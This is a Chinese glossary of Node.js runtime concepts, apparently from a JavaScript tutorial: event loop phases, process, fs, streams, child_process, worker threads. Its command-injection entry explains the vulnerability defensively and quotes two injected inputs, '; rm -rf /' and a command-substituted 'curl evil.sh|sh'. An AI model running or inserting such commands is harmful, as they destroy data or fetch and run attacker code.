## Node.js 运行时

### Node.js（Node.js 运行时）

Node.js 是把 **V8 引擎**与**宿主能力**（文件、网络、进程、系统调用）捆在一起的 JavaScript 运行时，让 JS 脱离浏览器也能在服务端与命令行里运行。它的技术定位是：**单个 JS 执行线程 + 非阻塞 I/O + 事件循环**，用很少的线程撑起大量并发连接。关键细节：Node 既不是语言也不是框架——语言规范由 V8 提供，Node 只负责「语言之外的一切」（模块系统、内置库、进程与 I/O 接口）。**常见误解**：以为 Node 就是「浏览器里的 JS 换个地方跑」——它没有 `window`/`document`/DOM，却多了 `process`、`Buffer`、`fs`、`node:` 前缀的内置模块。

也见 [Node.js Host Environment（Node 宿主环境）](#nodejs-host-environmentnode-宿主环境)、[Event Loop（事件循环）](#event-loop事件循环)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)、[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### Runtime（运行时）

运行时是「让 JavaScript 代码真正跑起来」的整套基础设施，可以拆成三层：**引擎**（解析与执行代码，如 V8）、**宿主环境**（提供语言之外的 API，如浏览器的 DOM 或 Node 的 `fs`）、**内置库**（标准化的宿主 API 集合）。同一段 JS 换一个运行时，能用的 API 就完全变了——`setTimeout` 在浏览器和 Node 里都存在，但那是因为两边各自实现，而不是语言语法。关键细节：ECMAScript 只规定语言本身，`console`、`setTimeout`、`fetch` 全都属于宿主，由此才能解释「浏览器能跑、Node 报 `document is not defined`」这类现象。

也见 [Node.js（Node.js 运行时）](#nodejsnodejs-运行时)、[V8 Engine（V8 引擎）](#v8-enginev8-引擎)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### V8 Engine（V8 引擎）

V8 是 Google 为 Chrome 开发的 JavaScript 引擎，也是 Node.js 的执行内核，负责把 JS 源码变成机器码并管理内存。它把「解释执行」与「编译执行」结合：先由 **Ignition** 解释器快速跑起来并收集类型反馈，热点函数再交给 **TurboFan** 优化编译器生成高效机器码。关键细节：V8 只管 JS 语言本身，**定时器、文件、网络一律不归它管**；它还负责垃圾回收，因此「对象形状稳定」的代码（不要随意增删属性）跑得更快。可以用 `process.versions.v8` 查看当前版本。

也见 [JIT / Just-In-Time Compilation（即时编译）](#jit-just-in-time-compilation即时编译)、[Thread Pool（线程池）](#thread-pool线程池)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### JIT / Just-In-Time Compilation（即时编译）

JIT 是「**运行时才编译**」的编译策略：代码不预先编译成机器码，而是在执行过程中，引擎识别出反复执行的「热点」代码后再编译成高度优化的机器码。它把解释器的启动快和编译器的执行快结合起来，这是现代 JS 性能的基础。关键细节：优化依赖**类型反馈**——同一个函数如果一会儿收到数字一会儿收到字符串，优化后的代码会被「去优化」（deopt）退回解释执行，这正是「保持类型稳定」的性能建议的来源。**常见误解**：以为 JIT 让 JS 变成「真正的编译语言」——优化随时可能失效，JS 的性能是可预测性差于静态语言的。

也见 [V8 Engine（V8 引擎）](#v8-enginev8-引擎)。

示例（性能册）：[`31_performance_and_memory/08_object_shape_optimization.js`](31_performance_and_memory/08_object_shape_optimization.js)

### Node.js Host Environment（Node 宿主环境）

Node 的宿主环境提供了一套**面向系统**的全局能力：`process`（进程信息与控制）、`Buffer`（二进制数据）、`console`、定时器、`fetch`、以及 `node:fs`、`node:http` 等内置模块。与浏览器宿主最大的区别在于：Node 没有 DOM、没有同源策略、没有 `window`；反过来浏览器没有文件系统、没有进程信号、没有 `__dirname`。这解释了大量「同一段代码两边行为不同」的现象——例如 `fetch` 在两边都可用的、而 `localStorage` 只在浏览器存在。**常见误解**：以为 `globalThis` 在两边是同一个东西——名字相同，但上面挂的属性完全不同。

也见 [Browser Runtime（浏览器运行时）](#browser-runtime浏览器运行时)、[Runtime（运行时）](#runtime运行时)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### Event Loop（事件循环）

事件循环是 Node 的**调度中枢**：它不断地从各个队列里取出回调来执行，让单线程的 JS 也能处理成千上万的并发 I/O。工作模型是「**回调登记 → 交给 libuv → 内核完成 → 回调入队 → 循环取出执行**」，因此 JS 代码永远不会真的「等在 I/O 上」，而是先返回、等事件。关键细节：事件循环**只在同步代码跑完、且没有待处理任务时才会退出**——这既是「服务器持续运行」的原因，也是「忘了 close 的定时器会让进程不退」的原因。

也见 [Event Loop Phases（事件循环的六个阶段）](#event-loop-phases事件循环的六个阶段)、[libuv（libuv）](#libuvlibuv)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### Event Loop Phases（事件循环的六个阶段）

Node 的事件循环每一轮（tick）大致按六个阶段依次推进：**timers**（执行到期的 `setTimeout`/`setInterval` 回调）→ **pending callbacks**（上一轮延迟的系统回调，如某些 TCP 错误）→ **poll**（等待并执行 I/O 回调，没有活可干时会在这里阻塞）→ **check**（执行 `setImmediate` 回调）→ **close callbacks**（`socket.on('close')` 之类）。在两个阶段之间，Node 还会清空 **`process.nextTick` 队列**和 **Promise 微任务队列**。关键细节：`setTimeout(fn, 0)` 与 `setImmediate(fn)` 的先后顺序在 I/O 回调内部是确定的（`setImmediate` 先），在主模块里却可能不确定——因为第一轮进 poll 阶段的时机不定。

也见 [process.nextTick（nextTick 队列）](#processnextticknexttick-队列)、[setImmediate（check 阶段）](#setimmediatecheck-阶段)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### process.nextTick（nextTick 队列）

`process.nextTick(fn)` 把回调插到 **nextTick 队列**，它**不属于事件循环的任何阶段**，而是在当前操作结束后、进入下一阶段前立刻清空——优先级高于 Promise 微任务，也高于所有定时器。用途是在「同步代码还没走完」时保证顺序，例如把错误异步抛出、让构造函数先返回对象再触发回调。**关键细节与常见误解**：`nextTick` **不是**「下一轮事件循环」，它是「本轮立刻」；而且递归调用 `nextTick` 会**饿死事件循环**——I/O 与定时器永远排不上队，因为 nextTick 队列只要非空就会被一直清空。

也见 [setImmediate（check 阶段）](#setimmediatecheck-阶段)、[Microtask（微任务）](#microtask微任务)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### setImmediate（check 阶段）

`setImmediate(fn)` 在事件循环的 **check 阶段**执行回调，也就是「当前这一轮 I/O 处理完之后、下一轮 timers 之前」。它与 `process.nextTick` 常被搞混：**语义上 `setImmediate` 才是「稍后」，而 `nextTick` 是「立刻」**。实际排序规律是：`nextTick` → Promise 微任务 → `setImmediate` → 定时器（在 I/O 回调内部尤其稳定，`setImmediate` 一定早于 `setTimeout(fn, 0)`）。**常见误解**：以为名字里的 "Immediate" 表示马上执行——恰恰相反，它是所有「延迟执行」里最靠后的一档，只是比定时器可靠（不受最小延迟与系统时钟粒度影响）。

也见 [process.nextTick（nextTick 队列）](#processnextticknexttick-队列)、[Event Loop Phases（事件循环的六个阶段）](#event-loop-phases事件循环的六个阶段)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### Microtask（微任务）

微任务是 Promise 回调（`.then`/`await` 之后的部分）、`queueMicrotask` 以及 `MutationObserver` 回调所在的队列，**每执行完一个宏任务（一段同步脚本、一个定时器回调）就会整体清空一次**，且中途新加入的微任务也会在同一轮被处理完。它与 `nextTick` 队列的关系是：两者都在阶段之间清空，但 **`nextTick` 队列先于微任务队列**。关键细节：`await` 会把函数剩余部分变成微任务，所以「`await` 之后代码的执行时机」比很多人想象得更早——它在当前同步任务结束后立即恢复，不必等定时器。

也见 [process.nextTick（nextTick 队列）](#processnextticknexttick-队列)、[Event Loop（事件循环）](#event-loop事件循环)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### process Object（process 对象）

`process` 是 Node 注入的**全局对象**，代表「当前正在运行的这个 node 进程」，任何模块里都能直接使用，不需要 import。它提供三类东西：**信息**（`process.version`、`process.versions`、`process.platform`、`process.pid`、`process.cwd()`）、**输入**（`process.argv`、`process.env`）、**控制**（`process.exit()`、`process.exitCode`、`process.on('SIGINT')`、`process.nextTick`、标准输入输出流）。关键细节：它是**单例**，且进程级状态（如 `exitCode`、环境变量）一旦改动对整个程序生效。

也见 [process.argv（命令行参数）](#processargv命令行参数)、[process.env（环境变量）](#processenv环境变量)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### process.argv（命令行参数）

`process.argv` 是命令行参数的**字符串数组**，前两项固定为 `node` 可执行文件路径与脚本文件路径，**真正的参数从索引 2 开始**（所以 `process.argv.slice(2)` 是最常见的写法）。关键细节：所有值都是字符串，数字要自己用 `Number()` 转换；带空格的值必须由调用方用引号包住，否则会被 shell 拆成多个参数。**常见误解**：以为 `argv[0]` 是脚本名——它是 `node` 的路径，脚本名在 `argv[1]`；参数一多就该改用 `node:util` 的 `parseArgs`，别再手写解析循环。

也见 [node:util（parseArgs / promisify / inspect）](#nodeutilparseargs-promisify-inspect)、[process Object（process 对象）](#process-objectprocess-对象)。

示例：[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### process.env（环境变量）

`process.env` 是操作系统传给进程的一组「键 = 值」字符串集合，是「十二要素应用」推荐的配置方式：把端口、数据库地址、密钥放在环境里，而不是写死在代码里。关键细节：**取值永远是字符串或 `undefined`**，`PORT=3000` 读出来是 `"3000"`，要自己转数字；给不存在的键赋值不会报错，可以借此设置默认值（如 `process.env.NODE_ENV ??= 'development'`）。**常见误解与安全要点**：环境变量对进程内的所有代码可见，也会被子进程继承，因此**不要把密钥泄露进日志或前端代码**；`.env` 文件只是本地开发的便利，不该提交进版本库。

也见 [node:util（parseArgs / promisify / inspect）](#nodeutilparseargs-promisify-inspect)、[Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)。

示例：[`26_node_core/16_env_and_dotenv.js`](26_node_core/16_env_and_dotenv.js)

### Exit Code（退出码）

退出码是进程结束时返回给操作系统（进而给 shell 与 CI）的一个整数：**0 表示成功，非 0 表示某种失败**。Node 里有两种设置方式——设置 `process.exitCode = 1` 让进程**自然退出时**带上该值，或者调用 `process.exit(1)` **立刻**结束。关键细节：退出码是整个命令行工具链的契约，CI 靠它判断构建成败，`npm run` 靠它决定是否继续链式执行，`spawn`/`exec` 的回调也靠它判断子进程结果（被信号杀死时 `code` 为 `null`、`signal` 有值）。

也见 [process.exit（强制退出）](#processexit强制退出)、[Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)、[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### process.exit（强制退出）

`process.exit(code)` 会**立即**结束进程：同步代码立刻中断，未完成的异步 I/O、未 flush 的输出、未执行的 `finally` 都可能被直接丢弃。关键细节：写文件、写 socket、`console.log` 到管道时都可能有缓冲区还没刷出去，**在 `exit` 前强行调用很容易丢数据**；正确做法是设置 `process.exitCode` 然后让事件循环自然结束，或先 `await` 完成清理再退出。**常见误解**：以为 `exit` 会「等待收尾」——它不会给任何回调机会，`process.on('exit')` 里也只能跑同步代码。

也见 [Exit Code（退出码）](#exit-code退出码)、[Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### Graceful Shutdown（优雅关闭）

优雅关闭指收到终止请求后**停止接收新请求、把手上的活干完、释放资源、再退出**的过程，是服务端进程的基本素养。典型步骤是：监听 `SIGTERM`/`SIGINT` → 停止监听端口（`server.close()`）→ 等待进行中的请求与数据库事务结束 → 关闭连接池 → 设置退出码并退出；同时要设一个「兜底超时」，超时就强杀，避免永久挂起。关键细节：容器与进程管理器（Docker、systemd、PM2）默认发的是 `SIGTERM`，**不处理它就会导致请求被硬切断**；还要防备重复信号（连按 Ctrl+C）与 `unhandledRejection` 中断流程。

也见 [Process Signal / SIGTERM / SIGINT（进程信号）](#process-signal-sigterm-sigint进程信号)、[Exit Code（退出码）](#exit-code退出码)。

示例：[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### Process Signal / SIGTERM / SIGINT（进程信号）

信号是操作系统发给进程的**异步通知**，Node 通过 `process.on('SIGINT', handler)` 之类的方式注册处理函数。常用两个：**`SIGINT`** 由 Ctrl+C 触发（可被捕获后「忽略」），**`SIGTERM`** 是默认的「请你体面地退出」信号（同样可捕获），而 **`SIGKILL`（Windows 上是强杀）无法被捕获**，只能接受。关键细节：跨平台差异明显——Windows 没有真正的 POSIX 信号，libuv 只能退化成 `TerminateProcess`，因此 `SIGTERM` 在 Windows 上的语义并不可靠；另外注册了信号监听会让进程「不自动退出」，必须在处理函数里显式收尾。

也见 [Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)、[child_process（子进程）](#child_process子进程)。

示例：[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)、[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### Callback API / Promise API / Sync API（三套 API 风格）

Node 的许多核心模块（最典型的是 `fs`）同时提供**三套等价 API**：同步版（`readFileSync`，直接返回结果、阻塞线程）、回调版（`readFile(path, cb)`，错误优先回调 `(err, data)`）、Promise 版（`node:fs/promises` 的 `readFile`，可 `await`）。它们不是三个不同的功能，而是同一次系统调用的三种包装方式。选择原则：**启动脚本与一次性 CLI 用同步版最省心；网络服务里一律用异步版**，否则一个慢磁盘就能卡死整个事件循环。回调版还能用 `util.promisify` 转成 Promise，避免手写包装。

也见 [Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）](#blocking-vs-non-blocking-io阻塞式与非阻塞式-io)、[node:fs（文件系统模块）](#nodefs文件系统模块)。

示例：[`26_node_core/04_fs_sync.js`](26_node_core/04_fs_sync.js)、[`26_node_core/05_fs_callback.js`](26_node_core/05_fs_callback.js)、[`26_node_core/06_fs_promises.js`](26_node_core/06_fs_promises.js)

### Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）

阻塞式 I/O 指调用发出后**线程停在那里等结果**（如 `readFileSync`），期间什么都做不了；非阻塞 I/O 指调用立刻返回，结果稍后通过回调/Promise 交付。Node 的并发能力正建立在后者之上：单线程也能同时「等」很多个 I/O，因为等待的代价被交给了操作系统。关键细节：**异步不等于并行**——CPU 密集的计算（大循环、压缩、加密）依然会卡住事件循环，那种场景需要 `worker_threads`；而 `fs` 的多数异步操作实际跑在 libuv 的**线程池**里，所以「异步」并不总是零成本。

也见 [Thread Pool（线程池）](#thread-pool线程池)、[libuv（libuv）](#libuvlibuv)。

示例：[`26_node_core/04_fs_sync.js`](26_node_core/04_fs_sync.js)、[`26_node_core/05_fs_callback.js`](26_node_core/05_fs_callback.js)

### libuv（libuv）

libuv 是 Node 底层的**跨平台异步 I/O 库**（C 语言编写），它把各操作系统互不相同的 I/O 机制（Linux 的 epoll、macOS 的 kqueue、Windows 的 IOCP）统一成一套接口，并实现了**事件循环本身**与**线程池**。换句话说：V8 负责跑 JS，libuv 负责「让等待变得高效」。关键细节：凡是操作系统没有提供异步接口的操作（文件读写、DNS 查询、`zlib` 压缩、`crypto` 的部分计算），libuv 都丢进线程池执行；`process.versions.uv` 可以查到版本号。

也见 [Event Loop（事件循环）](#event-loop事件循环)、[Thread Pool（线程池）](#thread-pool线程池)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### Thread Pool（线程池）

线程池是 libuv 内部维护的一小组工作线程（默认 **4** 个，可用环境变量 `UV_THREADPOOL_SIZE` 调整），用来执行那些操作系统不提供异步接口的任务：文件读写、DNS 解析、`zlib`、部分 `crypto`。关键细节：池子大小固定，**一旦被占满，后续任务只能排队**——比如同时发起 8 个耗时的 `pbkdf2` 哈希，后 4 个会明显变慢，这正是「加密操作会拖慢文件读取」的常见故障原因。**常见误解**：以为「Node 是单线程」——准确说法是「**单个 JS 执行线程 + 一个线程池 + 一个事件循环**」，真正并行干活的可以是主线程之外的多个线程。

也见 [libuv（libuv）](#libuvlibuv)、[Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)。

示例：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### node:fs（文件系统模块）

`node:fs` 是 Node 的文件系统模块，提供读、写、追加、复制、重命名、删除、创建目录、读取目录、查看文件元信息等能力。它有同步、回调、Promise 三套 API（也见 [Callback API / Promise API / Sync API](#callback-api-promise-api-sync-api三套-api-风格)），选项对象里支持 `encoding`（不写则返回 `Buffer`）、`flag`（`'w'` 覆盖、`'a'` 追加）、`mode`。关键细节：**相对路径是相对 `process.cwd()` 而不是相对脚本文件**，这是「换个目录运行就找不到文件」的根源，稳妥做法是用 `import.meta.dirname` 拼绝对路径；另外多数 `fs` 调用需要自己处理 `ENOENT`、`EACCES` 等错误码。

也见 [node:path（路径模块与跨平台分隔符）](#nodepath路径模块与跨平台分隔符)、[Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）](#blocking-vs-non-blocking-io阻塞式与非阻塞式-io)。

示例：[`26_node_core/04_fs_sync.js`](26_node_core/04_fs_sync.js)、[`26_node_core/05_fs_callback.js`](26_node_core/05_fs_callback.js)、[`26_node_core/06_fs_promises.js`](26_node_core/06_fs_promises.js)

### node:path（路径模块与跨平台分隔符）

`node:path` 是一组**纯字符串运算**的路径处理函数：`join`（拼接并规范化）、`resolve`（相对转绝对）、`dirname`/`basename`/`extname`（拆解）、`parse`/`format`（拆成对象再拼回）、`relative`。关键细节：Windows 用反斜杠 `\`、POSIX 用正斜杠 `/`，`path.join` 会自动用当前平台的分隔符，而 `path.posix` 与 `path.win32` 是**固定行为的两套实现**——写跨平台工具或处理 URL 路径时应显式使用其中之一，否则同一份路径字符串在 Windows 与 Linux 上会得到不同结果。**常见误解**：以为 `join` 会做安全检查——它只拼字符串，`..` 照样能穿目录，防目录穿越要在业务层校验。

也见 [node:fs（文件系统模块）](#nodefs文件系统模块)、[__dirname vs import.meta.dirname（目录名变量）](#__dirname-vs-importmetadirname目录名变量)。

示例：[`26_node_core/02_path_module.js`](26_node_core/02_path_module.js)

### node:url & URLSearchParams（URL 模块与查询参数）

`node:url` 提供 Node 侧的 URL 处理能力，核心是两个 WHATWG 标准类：**`URL`**（解析、校验、读写 `protocol`/`host`/`pathname`/`search`/`hash`，并自动做百分号编码）与 **`URLSearchParams`**（把查询串当作可增删改查的键值集合，支持 `get`/`getAll`/`append`/`delete`/`sort`）。关键细节：**不要用字符串拼查询参数**——直接把值插进 URL 会在遇到 `&`、`=`、空格、中文时出错，而 `searchParams.set()` 会正确编码；`URL` 还能用来校验用户输入是不是合法地址（构造失败即抛错）。注意 `URL` 是全局类，浏览器与 Node 行为一致。

也见 [URL & URLSearchParams（URL 与查询参数）](#url-urlsearchparamsurl-与查询参数)、[node:path（路径模块与跨平台分隔符）](#nodepath路径模块与跨平台分隔符)。

示例：[`26_node_core/03_url_module.js`](26_node_core/03_url_module.js)、[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)

### Event-Driven（事件驱动）

事件驱动是一种**控制反转**的程序组织方式：程序不写成「从上到下做完所有事」的流水线，而是注册一堆回调，等外部事件（用户点击、数据到达、定时器到期）发生时由运行时回头调用。Node 的整个架构都建立在这个模型上——HTTP 服务器是 `request` 事件、流是 `data`/`end` 事件、进程是信号事件。关键细节：事件驱动让「等待」不再占用线程，但代价是**控制流被切碎**：错误处理要靠回调参数或 `error` 事件，顺序推理比同步代码难，这也是 Promise/`async-await` 出现的原因之一。

也见 [EventEmitter（事件发射器）](#eventemitter事件发射器)、[Publish/Subscribe（发布订阅）](#publishsubscribe发布订阅)。

示例：[`26_node_core/07_events_eventemitter.js`](26_node_core/07_events_eventemitter.js)、[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### EventEmitter（事件发射器）

`EventEmitter` 是 `node:events` 导出的类，是 Node 事件模型的**最小实现**：`on`/`addListener` 注册监听器、`emit` 触发同名事件、`once` 只监听一次、`off`/`removeListener` 取消、`removeAllListeners` 清空、`listenerCount` 统计。用法上通常让自定义类 `extends EventEmitter`，把内部状态变化广播出去。关键细节：**名为 `'error'` 的事件极其特殊**——没有监听器时 `emit('error')` 会直接抛出异常并可能杀死进程，所以任何会发错的发射器都必须挂一个 `error` 处理；另外默认最多 10 个监听器，超出会打印「可能内存泄漏」警告（可用 `setMaxListeners` 调整）。

也见 [Publish/Subscribe（发布订阅）](#publishsubscribe发布订阅)、[Event-Driven（事件驱动）](#event-driven事件驱动)、[Stream（流）](#stream流)。

示例：[`26_node_core/07_events_eventemitter.js`](26_node_core/07_events_eventemitter.js)

### Publish/Subscribe（发布订阅）

发布订阅是「**事件发射器**」这一机制在架构层面的名字：发布者只管把消息丢到频道上，订阅者只管登记自己感兴趣的频道，双方互不认识，从而把耦合从「谁调用谁」降到「谁关心什么事件」。在 Node 里它由 `EventEmitter` 直接支撑，在浏览器里对应 `addEventListener` 与 `BroadcastChannel`，在分布式系统里则演化为消息队列。关键细节：它天然带来**易于扩展、易于测试**的好处，但也带来调试困难（调用链是隐式的）与「订阅了没取消」导致的内存泄漏（组件卸载时必须 `off`/`removeEventListener`）。

也见 设计模式册的 Observer Pattern（观察者模式）示例：[`30_design_patterns/05_observer.js`](30_design_patterns/05_observer.js)、[`30_design_patterns/06_pubsub.js`](30_design_patterns/06_pubsub.js)。

示例：[`26_node_core/07_events_eventemitter.js`](26_node_core/07_events_eventemitter.js)

### Stream（流）

流是「**分块处理数据**」的抽象：把数据看成一连串有序的小块（chunk），而不是一次性读进内存。Node 有四类流：**可读流**（Readable，如 `fs.createReadStream`）、**可写流**（Writable，如 `fs.createWriteStream`）、**双工流**（Duplex，同时可读可写，如 TCP socket）、**转换流**（Transform，读写之间做加工，如 `zlib.createGzip`）。关键细节：流都继承自 `EventEmitter`，靠 `data`/`end`/`error`/`drain` 事件驱动；它可以是**对象模式**（每个 chunk 是任意 JS 值）。**常见误解**：以为流只是「读取大文件」的语法糖——它真正解决的是**内存占用与处理延迟**：用流复制 10GB 文件，内存占用是常数级。

也见 [Readable & Writable Stream（可读流与可写流）](#readable-writable-stream可读流与可写流)、[Duplex & Transform Stream（双工流与转换流）](#duplex-transform-stream双工流与转换流)、[Backpressure（背压）](#backpressure背压)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### Readable & Writable Stream（可读流与可写流）

可读流是数据的**来源**：通过 `'data'` 事件或 `for await...of` 异步迭代（或用 `read()` 主动拉取）拿 chunk，结束时发 `'end'`（Streams 的 `'end'` 只在消费完后触发，`'close'` 表示底层资源已释放）。可写流是数据的**去向**：`write(chunk)` 写入、`end(chunk?)` 声明结束，`finish` 事件表示数据已全部交给底层。关键细节：**`write()` 返回布尔值而不是 Promise**——`false` 意味着内部缓冲区已满，这是背压信号的起点；`end()` 只能调用一次，之后再 `write` 会报错。

也见 [Backpressure（背压）](#backpressure背压)、[pipe（管道）](#pipe管道)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### Duplex & Transform Stream（双工流与转换流）

**双工流（Duplex）**两端可独立读写（读与写是两个互不相干的通道），典型代表是 TCP/WebSocket 连接；**转换流（Transform）**是双工流的特例，写进去的数据经过 `_transform` 加工后从可读端吐出来，典型代表是 `zlib.createGzip()`、`crypto.createCipheriv()` 与 `node:stream` 的 `Transform` 基类。两者都常用于「管道中间环节」：在 `source.pipe(gzip).pipe(dest)` 这一串里，gzip 就是转换流。关键细节：写活数据的代码要处理 `_flush`（结束时吐出最后一块）与错误传播——转换流出错时不会自动中断整条管道，需要监听 `'error'` 手动销毁。

也见 [Stream（流）](#stream流)、[pipe（管道）](#pipe管道)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### pipe（管道）

`readable.pipe(writable)` 把可读流的输出直接接到可写流的输入，**自动帮你处理背压**：内部缓冲区满时暂停上游，`drain` 后再恢复，同时把 `'end'` 转成 `end()`。链式调用 `a.pipe(b).pipe(c)` 就能搭出数据处理流水线，这是流最常用的用法。关键细节：`pipe` **不会自动转发错误**——上游出错时下游不会被关闭，容易造成句柄泄漏；因此生产代码更推荐 `stream.pipeline()`（会自动销毁所有流并把错误交给回调）或 `finished()`。

也见 [Backpressure（背压）](#backpressure背压)、[Stream（流）](#stream流)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### Backpressure（背压）

数据生产速度快于消费速度时的**反向压力**机制。流（stream）的 `write()` 在内部缓冲区满时返回 `false`，提示生产者应暂停写入、等 `drain` 事件再继续；Web Streams 则通过 `highWaterMark` 与 `desiredSize` 表达同样的含义。忽略背压的后果是内存持续增长直到进程崩溃 —— 这是处理大文件或高吞吐数据时最典型的故障原因。**常见误解**：以为 `write()` 返回 `false` 表示写失败了——它只是「暂时别写了」的流量控制信号，数据仍然会被写入，只是排队积压了。

也见 [pipe（管道）](#pipe管道)、[Readable & Writable Stream（可读流与可写流）](#readable-writable-stream可读流与可写流)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### readline（逐行读取）

`node:readline` 把输入流按换行符切成一行行文本，通过 `'line'` 事件或异步迭代器交给你，适合做交互式命令行、逐行日志处理、大文件按行解析。两个常用入口：`readline.createInterface({ input, output })`（面向终端交互，支持 `question` 提问）与 `readline.createInterface({ input, crlfDelay: Infinity })`（面向文件/管道逐行遍历）。关键细节：处理 CRLF 与 LF 的差异要设置 `crlfDelay`；Windows 上路径与换行符的差异是这一模块最常见的坑；用 `for await (const line of rl)` 写法比事件更简洁，且便于 `break` 提前退出。

也见 [Stream（流）](#stream流)、[Process Signal / SIGTERM / SIGINT（进程信号）](#process-signal-sigterm-sigint进程信号)。

示例：[`26_node_core/09_readline_cli.js`](26_node_core/09_readline_cli.js)

### child_process（子进程）

`node:child_process` 让 Node 启动**别的进程**并与之通信，是「调用外部命令」的官方途径。四种主要方式构成一张二维表：**要不要经过 shell** × **要不要等结果全部返回**——`spawn`（不经过 shell、流式）、`exec`（经过 shell、缓冲全部输出）、`execFile`（不经过 shell、缓冲输出）、`fork`（专门启动 Node 脚本，并自带 IPC 通道）。关键细节：子进程的 stdout/stderr 是流，可以管道给父进程或其它进程；子进程**不会随父进程自动死亡**（除非显式处理），父进程退出后可能留下孤儿进程。

也见 [spawn / exec / execFile（三种启动方式）](#spawn-exec-execfile三种启动方式)、[Command Injection（命令注入）](#command-injection命令注入)。

示例：[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### spawn / exec / execFile（三种启动方式）

三者的取舍可以浓缩成两条判断：**输出量大不大**、**要不要用 shell 语法**。`spawn` 不经过 shell，参数以数组传入，输出是流，适合长时间运行、输出巨大的命令（如 ffmpeg、`git log`）；`exec` 会启动 shell 并把完整命令当字符串解析，因此**支持管道、重定向、通配符**，但输出全部缓冲在内存里，且有**命令注入**风险，只适合短小、输入可信的命令；`execFile` 像 `spawn` 一样不经过 shell，但把结果缓冲后一次性回调，适合「跑一下、拿结果」的场景。**常见误解**：以为 `spawn` 也能写 `ls -la | grep x`——管道属于 shell 语法，`spawn` 下会被当成普通参数。

也见 [child_process（子进程）](#child_process子进程)、[Command Injection（命令注入）](#command-injection命令注入)。

示例：[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### Command Injection（命令注入）

命令注入指**用户输入被拼进命令行字符串并交给 shell 解释**，导致攻击者能执行任意命令（如输入 `; rm -rf /` 或 `$(curl evil.sh|sh)`）。它出现在 `child_process.exec`、`execSync` 以及任何带 `shell: true` 的调用中，是服务端最危险的漏洞类型之一。防御方式是**根本性的**：改用 `spawn`/`execFile` 并把参数作为数组传递（`shell: false`），这样参数永远不会被 shell 重新解析；如果必须用 shell，就用严格白名单校验输入、避免 `;`、`|`、`&`、`$`、反引号等元字符，并遵循最小权限原则。**常见误解**：以为「把引号转义一下就安全了」——不同平台与 shell 的转义规则不一致，转义永远不是可靠方案。

也见 [spawn / exec / execFile（三种启动方式）](#spawn-exec-execfile三种启动方式)，以及安全册的 [`32_security_and_best_practices/01_input_validation.js`](32_security_and_best_practices/01_input_validation.js)。

示例：[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### Worker Threads & Main Thread（工作线程与主线程）

**主线程**是 Node 启动时唯一执行 JS 的线程，事件循环跑在这里；**`node:worker_threads`** 让一个进程拥有多个 JS 执行线程，每个 worker 有独立的 V8 实例、独立的事件循环与独立的内存堆，通过消息传递（`postMessage`）或共享内存（`SharedArrayBuffer`）通信。它解决的是**CPU 密集型任务卡住事件循环**的问题：把大循环、压缩、加密、图像处理丢给 worker，主线程继续响应请求。关键细节：worker 有启动成本（毫秒级，别为小任务创建），`worker.terminate()` 是强制结束；`cluster` 解决的是「多进程利用多核」，而 worker 解决的是「一个进程内真并行」——两者不要混淆。

也见 [Concurrency vs Parallelism（并发与并行）](#concurrency-vs-parallelism并发与并行)、[Thread Pool（线程池）](#thread-pool线程池)。

示例：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### SharedArrayBuffer（共享内存缓冲区）

`SharedArrayBuffer`（SAB）是一块**可以被多个线程同时读写**的内存，与普通 `ArrayBuffer` 的关键区别在于：普通缓冲区传给 worker 时会**结构化克隆（复制一份）**，而 SAB 传过去的是同一块内存的引用，任何线程的修改立刻对其它线程可见。它带来的好处是零拷贝与超高速数据共享（适合图像处理、实时计算），代价是**必须自己处理同步**。关键细节：SAB 在浏览器里需要跨源隔离（COOP/COEP 响应头）才能使用，在 Node 里则可以直接用；它不能直接存放普通 JS 对象，必须通过 TypedArray 视图读写数值。

也见 [Atomics（原子操作）](#atomics原子操作)、[Race Condition（竞态条件）](#race-condition竞态条件)，以及二进制册的 [`24_typed_arrays/01_arraybuffer_basics.js`](24_typed_arrays/01_arraybuffer_basics.js)。

